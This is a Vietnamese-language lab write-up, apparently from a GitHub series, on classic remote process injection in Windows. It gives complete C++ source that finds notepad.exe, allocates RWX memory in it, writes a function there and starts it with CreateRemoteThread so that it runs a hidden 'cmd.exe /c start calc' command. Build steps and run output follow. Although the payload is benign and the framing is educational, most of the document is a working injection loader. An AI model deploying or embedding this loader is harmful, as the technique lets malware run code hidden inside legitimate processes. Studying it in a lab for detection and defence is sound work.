
---

# 📝 [PE 02] Classic Code Injection — Remote Process

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Classic Code Injection tại Tiến trình Từ xa (Remote Process)** đại diện cho mô hình mở rộng biên giới thực thi của mã máy sang một không gian địa chỉ ảo cô lập. Khác với mô hình kích nổ nội tại (In-Process Context - PE 01), giải thuật này can thiệp trực tiếp vào cấu trúc bộ nhớ và chiếm dụng ngữ cảnh lập lịch (Thread Context) của một tiến trình hợp pháp khác đang vận hành trên hệ thống (ví dụ: `notepad.exe`) để thực thi khối mã máy độc lập vị trí (Position-Independent Code - PIC).

### 🎯 Mục tiêu nghiên cứu:

* **Thao túng bộ nhớ chéo tiến trình (Cross-Process Memory Manipulation)**: Nghiên cứu cơ chế bẻ gãy tính cô lập của không gian địa chỉ ảo (Virtual Address Space Isolation) được bảo vệ bởi phần cứng và hệ điều hành.
* **Khống chế luồng thực thi từ xa (Remote Thread Hijacking)**: Làm chủ cơ chế điều phối và khởi tạo Thread Subsystem của Windows Kernel nhằm cưỡng bách tiến trình mục tiêu thực thi logic ngoài danh bạ.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Rào cản lớn nhất khi can thiệp chéo tiến trình là cơ chế cô lập bộ nhớ ảo của kiến trúc bảo mật Windows. Để thiết lập bệ phóng và thực thi mã máy phẳng lọt lòng inside tiến trình đích, hệ điều hành điều phối dòng chảy qua 4 giai đoạn ngầm tại tầng nhân Kernel:

```
[OpenProcess: Khởi tạo kết nối Handle]
       └──> [VirtualAllocEx: Cấp phát trang nhớ ảo từ xa]
                 └──> [WriteProcessMemory: Bơm mã máy chéo biên giới RAM]
                           └──> [CreateRemoteThread: Chiếm quyền điều phối CPU]

```
  
<img width="509" height="783" alt="image" src="https://github.com/user-attachments/assets/9725e35c-ec8d-4617-8003-733c446113ef" />
  
1. **Ủy quyền can thiệp (`OpenProcess`)**: Loader gửi yêu cầu lên Security Subsystem của Kernel nhằm thiết lập một tay cầm (Handle) kết nối xuyên biên giới tới tiến trình mục tiêu. Yêu cầu bắt buộc phải đính kèm các quyền đặc quyền kịch khung bao gồm: `PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE` và `PROCESS_CREATE_THREAD`. Nhân Kernel thực hiện thẩm định Token bảo mật của Loader trước khi phê duyệt Handle.
2. **Phân bổ không gian ảo từ xa (`VirtualAllocEx`)**: Trình quản lý bộ nhớ mở rộng thuộc tính `Ex` cho phép Loader can thiệp vào không gian ảo của tiến trình đích thông qua Handle đã được phê duyệt. Windows Kernel tìm kiếm các trang nhớ rảnh trong cấu trúc bảng trang (Page Tables) của nạn nhân, chuyển trạng thái vùng nhớ sang `MEM_COMMIT` và lật cờ bảo vệ thành **`PAGE_EXECUTE_READWRITE` (RWX)**.
3. **Bơm dữ liệu xuyên không gian địa chỉ (`WriteProcessMemory`)**: Loader thực hiện lệnh sao chép mảng byte dữ liệu tuyệt đối cùng khối mã máy từ RAM cục bộ, đẩy qua kênh truyền Handle của nhân Kernel để ghi đè trực tiếp lên tọa độ ảo vừa được mở khóa bên lòng tiến trình đích.
4. **Cưỡng bức dòng chảy CPU (`CreateRemoteThread`)**: Windows Kernel khởi tạo một cấu trúc Thread Object hoàn toàn mới nằm lọt lòng trong danh bạ quản lý của tiến trình đích. Trình lập lịch (Scheduler) nạp địa chỉ của vùng nhớ Code Payload vào thanh ghi chỉ mục lệnh **`Rip`** của CPU, đồng thời nạp địa chỉ phân vùng chứa cấu trúc tham số tuyệt đối vào thanh ghi **`Rcx`** (Calling Convention chuẩn x64), ép CPU của tiến trình đích tự động triệu hồi thực thi logic.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

### Classic_Code_Injection_Remote.cpp:
```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

#pragma comment(lib, "user32.lib")

// Bộ quét RAM động tìm PID thích ứng theo tên tiến trình (Không phân biệt chữ hoa/thường)
DWORD GetTargetProcessPID(const std::wstring& procName) {
    DWORD pid = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            // Sử dụng _wcsicmp để tự động nhận diện Notepad.exe bất kể chữ hoa thường
            if (_wcsicmp(procName.c_str(), pe32.szExeFile) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return pid;
}

// 1. Định nghĩa cấu trúc con trỏ hàm tuyệt đối để xử lý độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm đích sẽ được tiêm vào lòng Notepad
// Hàm này gọi API hoàn toàn bằng địa chỉ tuyệt đối truyền qua lpParam để tránh lỗi nhảy RIP
DWORD WINAPI RemoteLaunchCalculator(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 02: CLASSIC CODE INJECTION REMOTE (CALC.EXE)" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetName = L"notepad.exe";
    DWORD dwPID = GetTargetProcessPID(targetName);

    if (dwPID == 0) {
        MessageBoxA(NULL, "[-] Target process not found! Please open Notepad first.", "Error", MB_OK | MB_ICONERROR);
        return EXIT_FAILURE;
    }

    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << dwPID << std::endl;

    // 1. Mở tiến trình đích với nhóm quyền cấu hình luồng bộ nhớ chéo
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwPID);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed!" << std::endl;
        return EXIT_FAILURE;
    }

    // Kích thước ước tính an toàn cho thân hàm thực thi
    SIZE_T functionSize = 500;

    // 2. Cấp phát phân vùng mã máy từ xa mang quyền RWX inside lòng Notepad
    LPVOID remoteCodeBuffer = VirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteCodeBuffer) {
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Phan vung Code RWX da thiet lap tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // 3. Cấp phát phân vùng dữ liệu tham số từ xa mang quyền RW inside lòng Notepad
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteData) {
        VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // 4. Khởi tạo cấu trúc dữ liệu cục bộ trước khi đẩy sang tiến trình đích
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        // Lấy chính xác địa chỉ tuyệt đối của WinExec để truyền sang Notepad
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // 5. Đẩy dữ liệu cấu trúc và mã máy của hàm xuyên biên giới sang RAM tiến trình đích
    WriteProcessMemory(hProcess, remoteCodeBuffer, (LPVOID)RemoteLaunchCalculator, functionSize, NULL);
    WriteProcessMemory(hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);
    std::cout << "[+] Anh xa logic ham va du lieu sang RAM Notepad hoan tat." << std::endl;

    std::cout << "[*] Dang khoi tao luong CreateRemoteThread tu xa..." << std::endl;

    // 6. Kích nổ Thread từ xa, ép CPU của Notepad nhảy vào vùng nhớ thực thi
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, pRemoteData, 0, NULL);
    if (!hThread) {
        std::cerr << "[-] CreateRemoteThread failed!" << std::endl;
        VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // Đợi luồng từ xa kết thúc chu kỳ xử lý mở máy tính
    WaitForSingleObject(hThread, INFINITE);
    std::cout << "[+] Luong Thread tu xa da hoan thanh nhiem vu." << std::endl;

    // 7. Giải phóng tài nguyên triệt để chống rò rỉ bộ nhớ (Memory Leak)
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::cout << "[+] Quy trinh giai phong RAM tu xa hoan tat." << std::endl;
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để tệp nhị phân `.exe` xuất bản đạt trạng thái độc lập hoàn toàn, bẻ gãy các lỗi thiếu thư viện DLL phụ thuộc khi vận hành độc lập trên môi trường máy ảo VM sạch hoặc Sandbox kiểm thử:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Chuyển đổi thanh cấu hình dự án sang chế độ **`Release`** và nền tảng kiến trúc **`x64`**.
2. Cấu hình cờ liên kết tĩnh hệ thống: Đi tới `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Thay đổi thuộc tính `Runtime Library` sang định dạng **`Multi-threaded (/MT)`**.

<img width="1001" height="684" alt="image" src="https://github.com/user-attachments/assets/7489f2f5-f70e-4db5-aef4-77b883e30a43" />


3. Tiến hành thực hiện thao tác chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân sạch bóng lỗi chuỗi.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy ứng dụng mục tiêu `Notepad.exe` trên môi trường Lab, sau đó thực thi tệp tin `.exe` thông qua cửa sổ dòng lệnh PowerShell ngoài đĩa thô:

```powershell
PS C:\Users\Admin\source\repos\Task6\PE01_Classic_Code_Injection_Local\x64\Release> C:\Users\Admin\source\repos\Task6\PE02_Classic_Code_Injection_Remote\x64\Release\Classic_Code_Injection_Remote.exe
====================================================
[*] PE 02: CLASSIC CODE INJECTION REMOTE (CALC.EXE)
====================================================
[+] Da tim thay Notepad.exe voi PID: 4556
[+] Phan vung Code RWX da thiet lap tai: 0x0000028628300000
[+] Anh xa logic ham va du lieu sang RAM Notepad hoan tat.
[*] Dang khoi tao luong CreateRemoteThread tu xa...
[+] Luong Thread tu xa da hoan thanh nhiem vu.
[+] Quy trinh giai phong RAM tu xa hoan tat.

```

### Demo
<img width="1920" height="600" alt="devenv_u3N7jWAxiY" src="https://github.com/user-attachments/assets/5618db93-2113-49cd-aeaa-1a563aebc68e" />

---
